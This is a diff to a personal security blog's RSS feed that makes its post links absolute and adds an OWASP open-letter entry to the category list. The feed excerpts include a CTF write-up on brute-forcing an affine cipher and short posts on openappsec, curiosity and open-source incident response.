@@ -718,14 +841,14 @@ Yep, google did its thing for me!&lt;/p&gt;
 &lt;h1 id=&quot;how-do-we-crack-it&quot;&gt;How do we crack it?&lt;/h1&gt;
 &lt;p&gt;I’ll be honest, I didn’t really do a lot of research here trying to understand how to manually crack it.  More googling showed that it’s known to be pretty easily brute-forced.  I love the &lt;a href=&quot;https://www.decode.fr/&quot;&gt;decode.fr&lt;/a&gt; site for these types of things.  They do have an &lt;a href=&quot;https://www.decode.fr/affine-cipher/&quot;&gt;affine cipher brute-forcing tool&lt;/a&gt;.  I plugged the input into that, and it presented a wide variety of results based on the values of A/B.  The first one it found looked to be the flag:
 &lt;br /&gt;&lt;br /&gt;
-&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/a-fine-cipher/bfed.png&quot; alt=&quot;decode.fr results&quot; title=&quot;Results from decode.fr's brute-force tool&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/a-fine-cipher/bfed.png&quot; alt=&quot;decode.fr results&quot; title=&quot;Results from decode.fr&apos;s brute-force tool&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;I didn’t do myself any favors by plugging this into a tool without learning more about it, but it does seem that like this is a very “CTF” type of challenge, as I haven’t ever seen AFFine Ciphers used in the wild.  While it’s possible, it’s extremely uncommon and trivial to crack.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/crypto/a-fine-cipher</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/crypto/a-fine-cipher</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/crypto/a-fine-cipher</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/crypto/a-fine-cipher</guid>
       </item>
     
       <item>
@@ -768,8 +891,8 @@ Yep, google did its thing for me!&lt;/p&gt;
 &lt;p&gt;I am writing this before I forget, and haven’t really played with openappsec yet.  I’m not even 100% confident that it’s going to work perfectly with microk8s, though I do see some events in the logs!  Hopefully I will have more time to continue evaluating it and can write up a more detailed review at a later date.&lt;/p&gt;
 </description>
         <pubDate>Tue, 07 Mar 2023 04:00:00 +0000</pubDate>
-        <link>/blog/openappsec-on-microk8s/</link>
-        <guid isPermaLink="true">/blog/openappsec-on-microk8s/</guid>
+        <link>https://www.leoreading.com/blog/openappsec-on-microk8s/</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/openappsec-on-microk8s/</guid>
       </item>
     
       <item>
@@ -806,8 +929,8 @@ Yep, google did its thing for me!&lt;/p&gt;
 &lt;p&gt;Even after all of that, yes, I sometimes chase squirrels.  It &lt;em&gt;is&lt;/em&gt; worth it to chase squirrels sometimes.  Feeling like you wasted your time on something helps you build your intuition.  Learn to be wrong, love to be wrong, and most importantly - act like a dog and chase a squirrel every now and then. You may never catch it, but you’ll have fun while doing it!&lt;/p&gt;
 </description>
         <pubDate>Fri, 10 Jun 2022 00:00:00 +0000</pubDate>
-        <link>/blog/chasing-squirrels-vs-hunting/</link>
-        <guid isPermaLink="true">/blog/chasing-squirrels-vs-hunting/</guid>
+        <link>https://www.leoreading.com/blog/chasing-squirrels-vs-hunting/</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/chasing-squirrels-vs-hunting/</guid>
       </item>
     
       <item>
@@ -892,8 +1015,8 @@ Yep, google did its thing for me!&lt;/p&gt;
 &lt;p&gt;If you contribute to an open-source project, consider what you might do to help investigate a potential security incident - would this type of incident handling be beneficial for your community?  If you have any thoughts or want to follow the discussion, swing by the &lt;a href=&quot;https://github.com/OWASP/threat-dragon/issues/419&quot;&gt;issue on Threat Dragon’s GitHub&lt;/a&gt; to discuss it!&lt;/p&gt;
 </description>
         <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
-        <link>/blog/incident-response-in-open-source/</link>
-        <guid isPermaLink="true">/blog/incident-response-in-open-source/</guid>
+        <link>https://www.leoreading.com/blog/incident-response-in-open-source/</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/incident-response-in-open-source/</guid>
       </item>
     
       <item>
@@ -905,16 +1028,14 @@ Yep, google did its thing for me!&lt;/p&gt;
 &lt;p&gt;If you’re seeing this, thanks for reading!  If It’s been more than a week or two since I posted this initial post, please do drop me a line: keep me honest!&lt;/p&gt;
 </description>
         <pubDate>Thu, 14 Apr 2022 06:00:00 +0000</pubDate>
-        <link>/blog/welcome-to-my-site/</link>
-        <guid isPermaLink="true">/blog/welcome-to-my-site/</guid>
+        <link>https://www.leoreading.com/blog/welcome-to-my-site/</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/welcome-to-my-site/</guid>
       </item>
     
 
     
       
         
-      
-    
       
     
       
@@ -946,6 +1067,12 @@ Yep, google did its thing for me!&lt;/p&gt;
     &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/security&quot;&gt;security&lt;/a&gt;&lt;/h4&gt;
     &lt;a name=&quot;security&quot;&gt;&lt;/a&gt;
      
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/owasp/open-letter-to-owasp-leadership-on-openness-community-and-engagement&quot;&gt;An Open Letter to OWASP Leadership: On Openness, Community, and Engagement&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
     &lt;article class=&quot;center&quot;&gt;
       &lt;h6&gt;&lt;a href=&quot;/blog/openappsec-on-microk8s/&quot;&gt;Openappsec on Microk8s&lt;/a&gt;&lt;/h6&gt;
     &lt;/article&gt;
@@ -1057,7 +1184,7 @@ Yep, google did its thing for me!&lt;/p&gt;
 &lt;/div&gt;
 
 </description>
-            <link>/blog/categories/</link>
+            <link>https://www.leoreading.com/blog/categories/</link>
           </item>
         
       
@@ -1075,7 +1202,7 @@ Yep, google did its thing for me!&lt;/p&gt;
  &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
 {% endfor %}
 &lt;/div&gt;</description>
-            <link>/blog/categories/hobbies/</link>
+            <link>https://www.leoreading.com/blog/categories/hobbies/</link>
           </item>
         
       
@@ -1101,7 +1228,7 @@ Yep, google did its thing for me!&lt;/p&gt;
  &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
 {% endfor %}
 &lt;/div&gt;</description>
-            <link>/blog/categories/ritsec-ctf-2023/</link>
+            <link>https://www.leoreading.com/blog/categories/ritsec-ctf-2023/</link>
           </item>
         
       
@@ -1117,7 +1244,7 @@ Yep, google did its thing for me!&lt;/p&gt;
  &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
 {% endfor %}
 &lt;/div&gt;</description>
-            <link>/blog/categories/security/</link>
+            <link>https://www.leoreading.com/blog/categories/security/</link>
           </item>
         
       
